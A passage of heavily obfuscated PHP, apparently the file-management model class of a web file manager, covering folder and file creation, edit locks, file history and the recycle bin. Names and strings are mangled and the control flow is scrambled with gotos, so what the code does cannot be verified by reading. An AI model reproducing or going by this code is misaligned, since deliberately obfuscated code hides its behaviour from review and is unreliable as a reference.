($eæÇõšíÍ¹[931] == $E°œ±‡¡°„ && 1 == $B¿©«»¿Æ) { $B¿ñœŒ¦ = strtr($d¼ñ×‡ìÊ™[1], $eæÇõšíÍ¹[1604], $eæÇõšíÍ¹[43]); $C÷ß²ÛÜé += \strlen($d¼ñ×‡ìÊ™[0]); } elseif (!1 !== ($bß¸†Ì¡‘ = strpos($BÇŒ¯©ô›, $eæÇõšíÍ¹[934], $C÷ß²ÛÜé))) { $C÷ß²ÛÜé = $bß¸†Ì¡‘ + 1; } } break; default: if ($eæÇõšíÍ¹[1605] == substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, 6)) { $eëæ¦ŒÜ—ˆ = $eæÇõšíÍ¹[1605]; $C÷ß²ÛÜé += 6; } elseif ($eæÇõšíÍ¹[109] == substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, 4)) { $eëæ¦ŒÜ—ˆ = $eæÇõšíÍ¹[109]; $C÷ß²ÛÜé += 4; $B¿ñœŒ¦ = $eæÇõšíÍ¹[109]; } elseif ($eæÇõšíÍ¹[1606] == substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, 4)) { $eëæ¦ŒÜ—ˆ = $eæÇõšíÍ¹[1607]; $C÷ß²ÛÜé += 4; $B¿ñœŒ¦ = $eæÇõšíÍ¹[1606]; } elseif ($eæÇõšíÍ¹[1608] == substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, 5)) { $eëæ¦ŒÜ—ˆ = $eæÇõšíÍ¹[1607]; $C÷ß²ÛÜé += 5; $B¿ñœŒ¦ = $eæÇõšíÍ¹[1608]; } elseif ($eæÇõšíÍ¹[1609] == substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, 6)) { $eëæ¦ŒÜ—ˆ = $eæÇõšíÍ¹[1609]; $C÷ß²ÛÜé += 6; if (1 == preg_match($eæÇõšíÍ¹[1610], substr($BÇŒ¯©ô›, $C÷ß²ÛÜé), $d¼ñ×‡ìÊ™)) { $C÷ß²ÛÜé += strlen($d¼ñ×‡ìÊ™[0]); $Dêíéˆ¢àâ = $eæÇõšíÍ¹[1611]; $B¿©«»¿Æ = preg_match($Dêíéˆ¢àâ, substr($BÇŒ¯©ô›, $C÷ß²ÛÜé), $d¼ñ×‡ìÊ™, PREG_OFFSET_CAPTURE); if (1 == $B¿©«»¿Æ) { $B¿ñœŒ¦ = substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, $d¼ñ×‡ìÊ™[0][1]); $C÷ß²ÛÜé += $d¼ñ×‡ìÊ™[1][1]; } } } elseif ($eæÇõšíÍ¹[1612] == substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, 9)) { $eëæ¦ŒÜ—ˆ = $eæÇõšíÍ¹[1612]; $C÷ß²ÛÜé += 9; } elseif (1 == preg_match($eæÇõšíÍ¹[1613], substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, 33), $d¼ñ×‡ìÊ™)) { $eëæ¦ŒÜ—ˆ = $eæÇõšíÍ¹[1575]; $C÷ß²ÛÜé += strlen($d¼ñ×‡ìÊ™[0]); $B¿ñœŒ¦ = intval($d¼ñ×‡ìÊ™[1]) . $eæÇõšíÍ¹[80] . intval($d¼ñ×‡ìÊ™[2]); } elseif (1 == preg_match($eæÇõšíÍ¹[1614], substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, 33), $d¼ñ×‡ìÊ™)) { $eëæ¦ŒÜ—ˆ = $eæÇõšíÍ¹[1615]; $B¿ñœŒ¦ = intval($d¼ñ×‡ìÊ™[1]) . $eæÇõšíÍ¹[80] . intval($d¼ñ×‡ìÊ™[2]); $C÷ß²ÛÜé += strlen($d¼ñ×‡ìÊ™[0]); } elseif (($F‹‹Äã“±é = strspn($BÇŒ¯©ô›, $eæÇõšíÍ¹[1616], $C÷ß²ÛÜé)) > 0) { $eëæ¦ŒÜ—ˆ = $eæÇõšíÍ¹[1617]; $B¿ñœŒ¦ = substr($BÇŒ¯©ô›, $C÷ß²ÛÜé, $F‹‹Äã“±é); $C÷ß²ÛÜé += $F‹‹Äã“±é; } break; } goto Cˆ±­Å°˜’; c‹Ş»àä¿Ü: $eæÇõšíÍ¹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eëæ¦ŒÜ—ˆ = $eæÇõšíÍ¹[43]; $B¿ñœŒ¦ = $eæÇõšíÍ¹[43]; goto Eªù³Ò˜¯ô; dÕ—Á²ïÊÏ: } } goto d–„˜±à™¡; f«áôªóƒ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($f¤»­Í’ö) { $C ã–Ëù…• =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BĞó”«™£­ = Model($C ã–Ëù…•[485])->where(array($C ã–Ëù…•[1434] => $f¤»­Í’ö))->find(); $b¯çºÔàå = $this->_mkdirRoot(SourceModel::TYPE_USER, $f¤»­Í’ö, $BĞó”«™£­[$C ã–Ëù…•[38]]); $this->userDesktopAdd($b¯çºÔàå); return $b¯çºÔàå; } public function userDesktopAdd($bÁ”Ä¢Í‹) { $EÜ‹¦ÎÂ£ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cŞ–ö´…ŠŠ = LNG($EÜ‹¦ÎÂ£[2367]); $bë²ÒÚÜ¼ = $this->mkdir($bÁ”Ä¢Í‹, $cŞ–ö´…ŠŠ); $this->metaSet($bë²ÒÚÜ¼, $EÜ‹¦ÎÂ£[2368], $EÜ‹¦ÎÂ£[93]); $this->metaSet($bÁ”Ä¢Í‹, $EÜ‹¦ÎÂ£[2369], $bë²ÒÚÜ¼); } public function groupRootAdd($b­ø¿³ÀòÛ) { $a…šŒÃïì =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aØâö¿ƒ = Model($a…šŒÃïì[469])->where(array($a…šŒÃïì[2191] => $b­ø¿³ÀòÛ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $b­ø¿³ÀòÛ, $aØâö¿ƒ[$a…šŒÃïì[38]]); } public function systemRootPathAdd($aãÀˆªñ†½) { if ($aãÀˆªñ†½ != $_SERVER[çŞáÓæÚô‚Ô‡][1096]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $aãÀˆªñ†½); } public function userRootRemove($C‚Î‚ôƒŠç) { $C³æì›ÃĞ¦ = $this->sourceRoot(SourceModel::TYPE_USER, $C‚Î‚ôƒŠç); if (!$C³æì›ÃĞ¦) { return; } $this->remove($C³æì›ÃĞ¦, !1); } public function groupRootRemove($BÁ«íÙâˆÅ) { $cæî„á‚Êù = $this->sourceRoot(SourceModel::TYPE_GROUP, $BÁ«íÙâˆÅ); if (!$cæî„á‚Êù) { return; } $this->remove($cæî„á‚Êù, !1); } private function _mkdirRoot($F ˆÇ¯´Ö, $BÄ¶ÈŞ¦Ò, $DÉËê¾Î) { goto fçÛ£ºµÔÊ; Cší¿ÉÎÆ´: $dÀŒ±¢ŒŠ¯ = "\115\x6f\144\145\154\123\157\165\162\x63\145\56\155\x6b\x64\x69\162\x52\157\x6f\164\x2e{$F ˆÇ¯´Ö}\56{$BÄ¶ÈŞ¦Ò}\x2e" . $DÉËê¾Î; CacheLock::lock($dÀŒ±¢ŒŠ¯); $aìÆ‡ø¥øÌ[$dÑâ…„ãµ[38]] = $DÉËê¾Î; goto Fè™³Š¢Ù; fçÛ£ºµÔÊ: $dÑâ…„ãµ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aìÆ‡ø¥øÌ = array($dÑâ…„ãµ[377] => 0, $dÑâ…„ãµ[532] => $F ˆÇ¯´Ö, $dÑâ…„ãµ[533] => $BÄ¶ÈŞ¦Ò, $dÑâ…„ãµ[529] => 1, $dÑâ…„ãµ[534] => USER_ID, $dÑâ…„ãµ[535] => USER_ID, $dÑâ…„ãµ[530] => $dÑâ…„ãµ[43], $dÑâ…„ãµ[536] => $dÑâ…„ãµ[481], $dÑâ…„ãµ[405] => 0, $dÑâ…„ãµ[531] => 0, $dÑâ…„ãµ[429] => 0, $dÑâ…„ãµ[537] => $dÑâ…„ãµ[43]); if ($CÊÈÎ‚Õ·Û = $this->where($aìÆ‡ø¥øÌ)->find()) { return $CÊÈÎ‚Õ·Û[$dÑâ…„ãµ[378]]; } goto Cší¿ÉÎÆ´; Fè™³Š¢Ù: $EÒå“ëí½½ = $this->add($aìÆ‡ø¥øÌ); $dŠÄ©£¥¹ğ = array($dÑâ…„ãµ[538] => short_id($EÒå“ëí½½)); $this->where(array($dÑâ…„ãµ[392] => $EÒå“ëí½½))->save($dŠÄ©£¥¹ğ); goto cŠÚÖŒ™½œ; cŠÚÖŒ™½œ: CacheLock::unlock($dÀŒ±¢ŒŠ¯); return $EÒå“ëí½½; goto BÅ‡çá´Ê; BÅ‡çá´Ê: } private function sourceRoot($BŸµ˜‘°Ã, $d‹îÇãÂ¿„, $aÈà»ô®¶ = false) { $e›¦’ëÅ¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B½ÊŠ½îåİ = array($e›¦’ëÅ¥[377] => 0, $e›¦’ëÅ¥[532] => $BŸµ˜‘°Ã, $e›¦’ëÅ¥[533] => $d‹îÇãÂ¿„); if ($Fä«‘Ô½¥” = $this->where($B½ÊŠ½îåİ)->find()) { return $aÈà»ô®¶ ? $Fä«‘Ô½¥” : $Fä«‘Ô½¥”[$e›¦’ëÅ¥[378]]; } return !1; } public function sourceRootGroup($a­åç·—ÕÉ) { $F¹¡”ÃÆÂ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_string($a­åç·—ÕÉ)) { $a­åç·—ÕÉ = array($a­åç·—ÕÉ); } $bøÅ¿£å = array($F¹¡”ÃÆÂ[377] => 0, $F¹¡”ÃÆÂ[532] => SourceModel::TYPE_GROUP, $F¹¡”ÃÆÂ[533] => array($F¹¡”ÃÆÂ[17], $a­åç·—ÕÉ)); $CËÛ¾Šö½æ = $this->listSource($bøÅ¿£å, 1000); return array_to_keyvalue($CËÛ¾Šö½æ[$F¹¡”ÃÆÂ[84]], $F¹¡”ÃÆÂ[467]); } public function mkfile($DÜœ½ìÜ ô, $C‡Ô¢Û‡…Ø, $EƒÏˆƒÂ‡¢ = '', $e¨º©³İœ¶ = REPEAT_RENAME) { $F®îãÀ¸‘å =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Bª²™£ß‹ = Model($F®îãÀ¸‘å[555])->addFileByContent($EƒÏˆƒÂ‡¢, $C‡Ô¢Û‡…Ø); return $this->_createFileCall($DÜœ½ìÜ ô, $C‡Ô¢Û‡…Ø, $Bª²™£ß‹, $e¨º©³İœ¶, $F®îãÀ¸‘å[1133]); } public function addFile($dóÏ‹‚Ä§‚, $dÅ‰¦ƒÈ±ğ, $aåÁ²ñÃÂº, $dÏãá²„·˜ = false, $A’ßÈÀ¥ƒ = REPEAT_RENAME) { $c±¼Á•Åã§ = Model($_SERVER[çŞáÓæÚô‚Ô‡][555])->addFile($dÅ‰¦ƒÈ±ğ, $aåÁ²ñÃÂº, $dÏãá²„·˜); return $this->_createFileCall($dóÏ‹‚Ä§‚, $aåÁ²ñÃÂº, $c±¼Á•Åã§, $A’ßÈÀ¥ƒ); } public function addFileByFileID($C½»¯œá¾Ù, $eñøí¥Èˆ, $FÀ«”±„§Š, $A–—ëÈƒ¼ = REPEAT_RENAME) { $AòçÛÍ¿ÓÛ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Fª…ß¶Ò¹Ø = Model($AòçÛÍ¿ÓÛ[555])->find($eñøí¥Èˆ); Model($AòçÛÍ¿ÓÛ[555])->linkAdd($eñøí¥Èˆ); return $this->_createFileCall($C½»¯œá¾Ù, $FÀ«”±„§Š, $Fª…ß¶Ò¹Ø, $A–—ëÈƒ¼); } public function addFileByRemote($b°‰ĞŠÒ ê, $A°í§‰Øë, $bõì‡™ÆÆë, $Cİ­Ç°»· = array(), $D™£¬­™…í = REPEAT_RENAME) { $C†ÁÍÆÎğ‹ = Model($_SERVER[çŞáÓæÚô‚Ô‡][555])->addFileByRemote($A°í§‰Øë, $bõì‡™ÆÆë, $Cİ­Ç°»·); return $this->_createFileCall($b°‰ĞŠÒ ê, $bõì‡™ÆÆë, $C†ÁÍÆÎğ‹, $D™£¬­™…í); } private function _createFileCall($EÑ©‹¨ƒ£ê, $D¡Ä³èÏôš, $dÓÆÂ’¿Å¦, $d“¡‚ˆõÉ, $bìöˆ¾‘¾À = "\165\x70\x6c\x6f\x61\144") { goto c ·ùĞ•¾; e¸ÖÇ„÷ë: return $DôÙßš²¨´; goto c—ˆ¼Ø«®Ø; c ·ùĞ•¾: $E¡ß¨«¨‘¿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DñŞßËÆÊ = !1; $this->lockWriteStart($EÑ©‹¨ƒ£ê, $D¡Ä³èÏôš); goto D·ë«ğôÑÄ; D·ë«ğôÑÄ: $DôÙßš²¨´ = $this->_createFile($EÑ©‹¨ƒ£ê, $D¡Ä³èÏôš, $dÓÆÂ’¿Å¦, $d“¡‚ˆõÉ, $DñŞßËÆÊ); if (!$DñŞßËÆÊ) { Model($E¡ß¨«¨‘¿[431])->remove($dÓÆÂ’¿Å¦[$E¡ß¨«¨‘¿[428]]); } else { if ($DôÙßš²¨´) { Model($E¡ß¨«¨‘¿[2339])->eventCreate($DôÙßš²¨´, $bìöˆ¾‘¾À); } } $this->lockWriteEnd($EÑ©‹¨ƒ£ê, $D¡Ä³èÏôš); goto e¸ÖÇ„÷ë; c—ˆ¼Ø«®Ø: } public function mkdir($Eİİ®œ™–ì, $c¸¿Ö”Å, $c¸Âê±Šõ = REPEAT_SKIP) { goto féÂ”ÖæéÅ; E§»ˆÊ‚‚: $this->lockWriteStart($Eİİ®œ™–ì, $c¸¿Ö”Å); if ($c¸Âê±Šõ !== !1) { $cäçÙ¡¨‚í = $this->fileNameExist($Eİİ®œ™–ì, $c¸¿Ö”Å); if ($cäçÙ¡¨‚í && $c¸Âê±Šõ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Eİİ®œ™–ì, $c¸¿Ö”Å); return $cäçÙ¡¨‚í; } $c¸¿Ö”Å = $this->fileNameAuto($Eİİ®œ™–ì, $c¸¿Ö”Å, $c¸Âê±Šõ); } $aéØ™Ø…÷† = array($A“£ğğŞ›é[529] => 1, $A“£ğğŞ›é[395] => $c¸¿Ö”Å, $A“£ğğŞ›é[530] => $A“£ğğŞ›é[43], $A“£ğğŞ›é[429] => 0, $A“£ğğŞ›é[531] => 0); goto Fø´‰”³¥¾; Fø´‰”³¥¾: $F¹”‡…ôƒ¬ = $this->_addSoure($aéØ™Ø…÷†, $eÎùÜÛÑéî); Model($A“£ğğŞ›é[2339])->eventCreate($F¹”‡…ôƒ¬, $A“£ğğŞ›é[1134]); $this->lockWriteEnd($Eİİ®œ™–ì, $c¸¿Ö”Å); goto d×õõ‰¼¡í; féÂ”ÖæéÅ: $A“£ğğŞ›é =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÎùÜÛÑéî = $this->sourceInfo($Eİİ®œ™–ì); if (!$eÎùÜÛÑéî) { return !1; } goto E§»ˆÊ‚‚; d×õõ‰¼¡í: return $F¹”‡…ôƒ¬; goto B³ì‡ñ¡ËÒ; B³ì‡ñ¡ËÒ: } private function _createFile($c½–¡ŒÖèÂ, $C˜ƒ”©•, $fÄÓğÎŞ¶Æ, $dùŞëµš›‚, &$AÛ”êî†‡ø) { goto aƒô²ÖÊ; E”¤ĞÀèƒØ: $f”˜×ÆÅ†© = array($aåŠ¼£ïÆ¥[529] => 0, $aåŠ¼£ïÆ¥[395] => $C˜ƒ”©•, $aåŠ¼£ïÆ¥[530] => get_path_ext($C˜ƒ”©•), $aåŠ¼£ïÆ¥[429] => $fÄÓğÎŞ¶Æ[$aåŠ¼£ïÆ¥[428]], $aåŠ¼£ïÆ¥[531] => $fÄÓğÎŞ¶Æ[$aåŠ¼£ïÆ¥[87]]); $Bï¡ƒÒš = $this->_addSoure($f”˜×ÆÅ†©, $cÊî‹äæ¼Û); $this->folderSizeReset($c½–¡ŒÖèÂ); goto Cµèöæã±¸; Cµèöæã±¸: return $Bï¡ƒÒš; goto e…‰ Ê»¼ò; aƒô²ÖÊ: $aåŠ¼£ïÆ¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cÊî‹äæ¼Û = $this->sourceInfo($c½–¡ŒÖèÂ); if (!$fÄÓğÎŞ¶Æ || !$cÊî‹äæ¼Û) { return !1; } goto c¥ğÇğÈ»ë; c¥ğÇğÈ»ë: if ($dùŞëµš›‚ !== !1) { $b£ ½¨ğˆŠ = $this->fileNameExist($c½–¡ŒÖèÂ, $C˜ƒ”©•); } $AÛ”êî†‡ø = !0; if ($dùŞëµš›‚ && $b£ ½¨ğˆŠ) { if ($dùŞëµš›‚ == REPEAT_SKIP) { $AÛ”êî†‡ø = !1; return $b£ ½¨ğˆŠ; } else { if ($dùŞëµš›‚ == REPEAT_REPLACE) { $D¿‚ÉÎ•Ê = $this->sourceInfo($b£ ½¨ğˆŠ); $dŞÈä—ÒæĞ = $this->fileHistory($D¿‚ÉÎ•Ê, $fÄÓğÎŞ¶Æ[$aåŠ¼£ïÆ¥[428]], $fÄÓğÎŞ¶Æ[$aåŠ¼£ïÆ¥[87]]); if (!$dŞÈä—ÒæĞ) { $AÛ”êî†‡ø = !1; } else { $this->folderSizeReset($c½–¡ŒÖèÂ); } return $b£ ½¨ğˆŠ; } else { $C˜ƒ”©• = $this->fileNameAuto($c½–¡ŒÖèÂ, $C˜ƒ”©•, $dùŞëµš›‚, !1); } } } goto E”¤ĞÀèƒØ; e…‰ Ê»¼ò: } protected function fileHistory($e¶±ªï…ÂÉ, $CÀÃĞæ²„™, $D·Œò½ÆÁĞ) { goto c±‚¨×„Ê·; c±‚¨×„Ê·: $BõÖˆóÚ ¦ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($e¶±ªï…ÂÉ[$BõÖˆóÚ ¦[428]] == $CÀÃĞæ²„™) { return !1; } $this->checkLock($e¶±ªï…ÂÉ[$BõÖˆóÚ ¦[378]], $CÀÃĞæ²„™); goto bíŞìÍªò; bíŞìÍªò: Model($BõÖˆóÚ ¦[2370])->addHistory($e¶±ªï…ÂÉ); $eï±ß»µÌè = array($BõÖˆóÚ ¦[535] => USER_ID, $BõÖˆóÚ ¦[399] => time(), $BõÖˆóÚ ¦[428] => $CÀÃĞæ²„™, $BõÖˆóÚ ¦[87] => $D·Œò½ÆÁĞ); $this->where(array($BõÖˆóÚ ¦[392] => $e¶±ªï…ÂÉ[$BõÖˆóÚ ¦[378]]))->save($eï±ß»µÌè); goto cŠ …ëá ï; cŠ …ëá ï: return !0; goto a˜³‹Ü¨„¯; a˜³‹Ü¨„¯: } public function checkLock($e×—¾¸¢›, $bæ±îÉ¢ÃÄ) { goto Cøê»«²ƒ‡; FõÌâ·Ã†: show_json(LNG($c†â§Ë °[2373]) . $c†â§Ë °[2374] . LNG($c†â§Ë °[2375]) . $c†â§Ë °[2376] . $EÔåÒÂ›ò . $c†â§Ë °[2377], !1); goto E±èß½ââ; F§³´ª¥®Ò: $cÇêÒÌ¹âß = Session::get($c†â§Ë °[2371]); $e¨×Âğ—ÙÇ = substr($CŒ—”œë¤ó[$c†â§Ë °[38]], 0, -1 - strlen($CŒ—”œë¤ó[$c†â§Ë °[170]])) . $c†â§Ë °[1396] . $cÇêÒÌ¹âß . $c†â§Ë °[101] . $CŒ—”œë¤ó[$c†â§Ë °[170]]; $Eë‰ßÆ‰Ú´ = Model($c†â§Ë °[555])->find($bæ±îÉ¢ÃÄ); goto Dç¸½ª±»; Dç¸½ª±»: $this->_createFileCall($CŒ—”œë¤ó[$c†â§Ë °[472]], $e¨×Âğ—ÙÇ, $Eë‰ßÆ‰Ú´, REPEAT_REPLACE, $c†â§Ë °[1133]); $a¨Í—´÷õŸ = $CŒ—”œë¤ó[$c†â§Ë °[426]][$c†â§Ë °[492]]; $EÔåÒÂ›ò = $a¨Í—´÷õŸ[$c†â§Ë °[2372]] ? $a¨Í—´÷õŸ[$c†â§Ë °[2372]] : $a¨Í—´÷õŸ[$c†â§Ë °[38]]; goto FõÌâ·Ã†; Cøê»«²ƒ‡: $c†â§Ë ° =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CŒ—”œë¤ó = $this->pathInfo($e×—¾¸¢›); if (!$this->fileIsLock($CŒ—”œë¤ó, !0)) { return; } goto F§³´ª¥®Ò; E±èß½ââ: } public function fileIsLock($CöîàòÚË , $cğ¬‡Æ“¨ = false) { goto C›÷¡ˆç; a…ò„´‰ĞŞ: return !1; goto bË³…øğ‹; C›÷¡ˆç: $C²«õË­ğñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset($CöîàòÚË [$C²«õË­ğñ[426]]) || !$CöîàòÚË [$C²«õË­ğñ[426]][$C²«õË­ğñ[489]]) { return !1; } if ($CöîàòÚË [$C²«õË­ğñ[426]][$C²«õË­ğñ[489]] != USER_ID) { return !0; } goto e‚·©¼å—¹; e‚·©¼å—¹: $f‚Ö“Ÿ½í¡ = $GLOBALS[$C²«õË­ğñ[16]][$C²«õË­ğñ[94]][$C²«õË­ğñ[490]]; if ($CöîàòÚË [$C²«õË­ğñ[426]][$C²«õË­ğñ[491]] <= time() - $f‚Ö“Ÿ½í¡) { $this->metaSet($CöîàòÚË [$C²«õË­ğñ[378]], $C²«õË­ğñ[489], null); $this->metaSet($CöîàòÚË [$C²«õË­ğñ[378]], $C²«õË­ğñ[491], null); } if ($cğ¬‡Æ“¨) { $this->metaSet($CöîàòÚË [$C²«õË­ğñ[378]], $C²«õË­ğñ[491], time()); } goto a…ò„´‰ĞŞ; bË³…øğ‹: } private function _addSoure($Cß¯†œ”—š, $c¯ªŒĞ¾ßÀ) { goto aòšÇ´Ó·…; F¥‚î†¥: $this->updateModifyTime($Cß¯†œ”—š[$dŒ‡êÜ„Ö„[472]]); $B¤µ¿ÓÃ£ = $dŒ‡êÜ„Ö„[2378] . $c¯ªŒĞ¾ßÀ[$dŒ‡êÜ„Ö„[378]]; if (isset(self::$cacheChildList[$B¤µ¿ÓÃ£])) { unset(self::$cacheChildList[$B¤µ¿ÓÃ£]); } goto cµ»É™îº; aòšÇ´Ó·…: $dŒ‡êÜ„Ö„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D‚š”ÏŞÃ = array($dŒ‡êÜ„Ö„[532] => $c¯ªŒĞ¾ßÀ[$dŒ‡êÜ„Ö„[380]], $dŒ‡êÜ„Ö„[533] => $c¯ªŒĞ¾ßÀ[$dŒ‡êÜ„Ö„[467]], $dŒ‡êÜ„Ö„[534] => USER_ID, $dŒ‡êÜ„Ö„[535] => USER_ID, $dŒ‡êÜ„Ö„[377] => $c¯ªŒĞ¾ßÀ[$dŒ‡êÜ„Ö„[378]], $dŒ‡êÜ„Ö„[536] => $c¯ªŒĞ¾ßÀ[$dŒ‡êÜ„Ö„[470]] . $c¯ªŒĞ¾ßÀ[$dŒ‡êÜ„Ö„[378]] . $dŒ‡êÜ„Ö„[57], $dŒ‡êÜ„Ö„[405] => 0, $dŒ‡êÜ„Ö„[537] => $dŒ‡êÜ„Ö„[43]); $Cß¯†œ”—š = array_merge($D‚š”ÏŞÃ, $Cß¯†œ”—š); goto F¥‚î†¥; aæáÇìö: $bŒÖ‚ÓÉ = array($dŒ‡êÜ„Ö„[538] => short_id($cÜÎß¢†‰‘)); $this->where(array($dŒ‡êÜ„Ö„[392] => $cÜÎß¢†‰‘))->save($bŒÖ‚ÓÉ); $this->setNamePinyin($cÜÎß¢†‰‘, $Cß¯†œ”—š[$dŒ‡êÜ„Ö„[38]]); goto Dãõœå˜‰Ó; cµ»É™îº: static $B„ñ¹ƒĞ¨ = false; if (!$B„ñ¹ƒĞ¨) { Hook::trigger($dŒ‡êÜ„Ö„[519], $Cß¯†œ”—š); $B„ñ¹ƒĞ¨ = !0; } $cÜÎß¢†‰‘ = $this->add($Cß¯†œ”—š); goto aæáÇìö; Dãõœå˜‰Ó: return $cÜÎß¢†‰‘; goto EÕ§óÛíÄ; EÕ§óÛíÄ: } public function remove($eÆ·¡äö Ó, $Cè¸Ë = true) { goto C†ƒõ„™øÀ; f³‘éÌåÅ±: CacheLock::lock($B©ß‘²Š™); $BŒÆ¡¹”ÖÈ = $this->fileNameExist($bÈŠÀïêÄŒ, $Féù‹Ö…š–); if (!$BŒÆ¡¹”ÖÈ) { $BŒÆ¡¹”ÖÈ = $this->mkdir($bÈŠÀïêÄŒ, $Féù‹Ö…š–, REPEAT_SKIP); $this->metaSet($BŒÆ¡¹”ÖÈ, $f°ÙÜÇî©[2383], $B°†„Í™¼÷); $this->metaSet($BŒÆ¡¹”ÖÈ, $f°ÙÜÇî©[2384], $DÈ«÷ø[$f°ÙÜÇî©[467]]); if ($DÈ«÷ø[$f°ÙÜÇî©[472]] != 0) { $this->metaSet($BŒÆ¡¹”ÖÈ, $f°ÙÜÇî©[2385], _get($cÕé×Åà÷‡, $f°ÙÜÇî©[2386])); } } goto d¿Şê³ã‰É; dê¯¿¿İõ×: $B°†„Í™¼÷ = $DÈ«÷ø[$f°ÙÜÇî©[380]] == self::TYPE_USER ? $f°ÙÜÇî©[546] : $f°ÙÜÇî©[977]; if ($B°†„Í™¼÷ == $f°ÙÜÇî©[546]) { $cÕé×Åà÷‡ = Model($f°ÙÜÇî©[485])->getInfo($DÈ«÷ø[$f°ÙÜÇî©[467]]); $Féù‹Ö…š– = !empty($cÕé×Åà÷‡[$f°ÙÜÇî©[2372]]) ? $cÕé×Åà÷‡[$f°ÙÜÇî©[2372]] : $cÕé×Åà÷‡[$f°ÙÜÇî©[38]]; $Féù‹Ö…š– = $f°ÙÜÇî©[257] . $Féù‹Ö…š– . $f°ÙÜÇî©[2380] . $DÈ«÷ø[$f°ÙÜÇî©[467]]; } else { $cÕé×Åà÷‡ = Model($f°ÙÜÇî©[469])->getInfo($DÈ«÷ø[$f°ÙÜÇî©[467]]); $Féù‹Ö…š– = _get($cÕé×Åà÷‡, $f°ÙÜÇî©[38]); $Féù‹Ö…š– = $f°ÙÜÇî©[167] . $Féù‹Ö…š– . $f°ÙÜÇî©[2381] . $DÈ«÷ø[$f°ÙÜÇî©[467]]; } $B©ß‘²Š™ = $f°ÙÜÇî©[2382] . md5($Féù‹Ö…š–); goto f³‘éÌåÅ±; C†ƒõ„™øÀ: $f°ÙÜÇî© =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÈ«÷ø = $this->sourceInfo($eÆ·¡äö Ó); $cİÁ‘äÛÏÙ = intval($DÈ«÷ø[$f°ÙÜÇî©[380]]) === self::TYPE_SYSTEM; goto Cë¶öî‰šÄ; D¢éæ¶ìÀ: return $CÅ­æŒóé; goto Bïğ®ˆ¤Â ; FêÙí¢¬´Á: $this->recycleClear($DÈ«÷ø); $CÅ­æŒóé = $this->move($eÆ·¡äö Ó, $BŒÆ¡¹”ÖÈ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($DÈ«÷ø[$f°ÙÜÇî©[472]]); goto D¢éæ¶ìÀ; Cë¶öî‰šÄ: $cæ÷Åå›“À = Model($f°ÙÜÇî©[1441])->get($f°ÙÜÇî©[2379]) == $f°ÙÜÇî©[93]; if ($cİÁ‘äÛÏÙ || $Cè¸Ë || !$cæ÷Åå›“À) { return $this->removeNow($eÆ·¡äö Ó, $Cè¸Ë); } $bÈŠÀïêÄŒ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto dê¯¿¿İõ×; d¿Şê³ã‰É: CacheLock::unlock($B©ß‘²Š™); $this->metaSet($eÆ·¡äö Ó, $f°ÙÜÇî©[2387], $DÈ«÷ø[$f°ÙÜÇî©[472]]); $this->where(array($f°ÙÜÇî©[378] => $eÆ·¡äö Ó))->save(array($f°ÙÜÇî©[399] => time())); goto FêÙí¢¬´Á; Bïğ®ˆ¤Â : } private function recycleClear($CĞ¡­¿©Œ¨) { $E§±Ã»Ã’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÕÈµ¥ä¤À = $this->childrenAll($CĞ¡­¿©Œ¨); $cÂ·÷Ï¼­ = array($E§±Ã»Ã’[392] => array($E§±Ã»Ã’[393], $BÕÈµ¥ä¤À[$E§±Ã»Ã’[2388]])); Model($E§±Ã»Ã’[2389])->where($cÂ·÷Ï¼­)->delete(); } public function removeNow($F·´Ş˜‡òÈ, $bæòÑİ›‚« = true) { goto A—ÀßŸ”í²; Cº„Å¡‹ì¯: Hook::trigger($bôªö·î‘†[2390], $BÒ‚ˆëíÀ, $bæòÑİ›‚«); if ($bæòÑİ›‚«) { Model($bôªö·î‘†[2389])->moveToRecycle($F·´Ş˜‡òÈ); } else { $bñÊì°ôÜ = $this->childrenAll($e””…ŠÚ§Ô); Model($bôªö·î‘†[516])->eventRemove($F·´Ş˜‡òÈ); $this->removeRelevance($bñÊì°ôÜ[$bôªö·î‘†[2388]], $bñÊì°ôÜ[$bôªö·î‘†[1266]]); } $this->folderSizeReset($e””…ŠÚ§Ô[$bôªö·î‘†[472]]); goto Fùç”º˜§Â; A—ÀßŸ”í²: $bôªö·î‘† =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A°ğ¿‚Êˆ = $_SERVER[$bôªö·î‘†[9]] . $bôªö·î‘†[10]; $BÌœ†§ƒŸÏ = $bôªö·î‘†[798]; goto A‹‚ŸĞÈ®ƒ; EšÄ¬µ…ÌØ: $this->lockMoveEnd($F·´Ş˜‡òÈ); Hook::trigger($bôªö·î‘†[1477], $BÒ‚ˆëíÀ, $bæòÑİ›‚«); return !0; goto aˆëï½âæ»; D·¸æ¡“Ë®: if (!$e””…ŠÚ§Ô) { return !0; } if ($e””…ŠÚ§Ô[$bôªö·î‘†[472]] == 0) { if 